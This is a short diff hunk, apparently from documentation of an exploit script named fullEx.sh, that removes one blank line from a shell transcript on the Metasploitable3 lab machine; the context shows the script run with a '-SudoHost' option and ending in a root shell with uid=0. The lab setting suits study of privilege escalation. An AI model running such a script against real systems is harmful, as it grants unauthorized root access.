@@ -62,5 +62,4 @@ vagrant@metasploitable3-ub1404:~/fullEx$ ./fullEx.sh -SudoHost
 root@dev# bash -i
 root@metasploitable3-ub1404:~/fullEx# id
 uid=0(root) gid=0(root) groups=0(root)
-  
 ```
